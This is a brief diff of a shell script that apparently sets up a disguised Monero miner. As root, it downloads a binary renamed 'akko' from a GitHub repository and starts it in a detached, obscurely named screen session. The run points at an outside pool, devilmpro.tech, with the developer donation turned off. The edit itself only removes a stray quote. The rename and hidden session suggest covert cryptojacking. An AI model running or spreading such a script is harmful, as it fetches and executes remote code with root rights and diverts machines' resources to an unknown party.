@@ -11,6 +11,6 @@ sudo bash enable_1gb_pages.sh
 sudo bash randomx_boost.sh
 sudo wget https://raw.githubusercontent.com/deepmonero/akko/main/akko
 sudo chmod +x akko
-screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages'
+screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
 sudo pkill akko
-screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages'
+screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
